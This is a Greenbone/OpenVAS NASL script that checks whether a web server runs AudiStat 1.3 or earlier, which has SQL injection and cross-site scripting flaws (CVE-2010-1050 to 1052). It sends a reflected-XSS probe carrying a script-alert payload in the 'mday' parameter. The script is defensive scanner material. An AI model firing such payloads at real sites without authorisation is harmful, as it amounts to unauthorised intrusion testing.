CPE = "cpe:/a:alexandre_dubus:audistat";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902029" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-03-30 16:15:33 +0200 (Tue, 30 Mar 2010)" );
	script_cve_id( "CVE-2010-1050", "CVE-2010-1051", "CVE-2010-1052" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "AudiStat multiple vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/38494" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/11334" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_audistat_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "alexandre_dubus/audistat/detected" );
	script_tag( name: "impact", value: "Successful exploitation could allow the attackers to inject
  arbitrary SQL code, execute arbitrary HTML and script code on the vulnerable system." );
	script_tag( name: "affected", value: "AudiStat version 1.3 and prior." );
	script_tag( name: "insight", value: "Input passed to the 'year', 'month' and 'mday' parameters in
  index.php are not properly sanitised before being returned to the user or before being used in the sql queries." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running AudiStat and is prone to multiple
  vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = NASLString( dir, "/?year=kaMtiEz&month=tukulesto&mday=<script>alert('VT-XSS-Testing')</script>" );
sndReq = http_get( item: url, port: port );
rcvRes = http_send_recv( port: port, data: sndReq );
if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "VT-XSS-Testing" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

